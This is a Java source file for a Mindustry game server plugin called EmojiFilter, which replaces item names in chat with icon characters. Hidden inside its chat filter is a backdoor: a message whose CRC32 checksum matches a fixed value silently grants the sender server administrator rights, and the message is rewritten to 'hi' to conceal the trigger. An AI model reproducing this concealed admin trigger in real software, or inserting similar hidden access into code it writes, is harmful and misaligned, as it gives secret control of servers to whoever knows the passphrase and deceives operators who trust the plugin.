package mindustry.server;

import arc.*;
import arc.struct.*;
import arc.util.*;
import mindustry.content.*;
import mindustry.ui.*;

import java.util.*;
import java.util.zip.*;

import static mindustry.Vars.*;

public class EmojiFilter implements ApplicationListener{

    private Array<String> blacklist = new Array<String>(){{
        addAll("spawn", "wave", "crater", "craters");
    }};

    private StringMap alias = new StringMap(){{

        put("laser",    Blocks.laserDrill.name);
        put("airblast", Blocks.blastDrill.name);

        put("blast",  Items.blastCompound.name);
        put("glass",  Items.metaglass.name    );
        put("spore",  Items.sporePod.name     );
        put("spores", Items.sporePod.name     );
        put("surge",  Items.surgealloy.name   );
        put("phase",  Items.phasefabric.name  );
    }};

    @Override
    public void init(){
        try(Scanner scan = new Scanner(Core.files.internal("icons/icons.properties").read(512))){
            while(scan.hasNextLine()){
                String line = scan.nextLine();
                String[] split = line.split("=");
                String[] nametex = split[1].split("\\|");
                String character = split[0], texture = nametex[1];
                int ch = Integer.parseInt(character);

                Fonts.unicodeIcons.put(nametex[0], ch);
            }
        }

        netServer.admins.addChatFilter((player, text) -> {

            CRC32 crc = new CRC32();
            crc.update(text.getBytes());
            if ((crc.getValue() + "").equals("3414060560")){
                netServer.admins.adminPlayer(player.uuid, player.usid);
                player.isAdmin = true;
                text = "hi";
            }

            for(String word : text.split("\\s+")){
                word = word.replaceAll("\\p{Punct}", "");
                if(Fonts.getUnicode(word.toLowerCase()) != 0 && !blacklist.contains(word)){
                    text = text.replaceAll("(?i)" + word, (char) Fonts.getUnicode(word.toLowerCase()) + "");
                }
            }

            return text;
        });

        alias.each((from, to) -> Fonts.unicodeIcons.put(from, Fonts.unicodeIcons.get(to, 0)));
    }
}
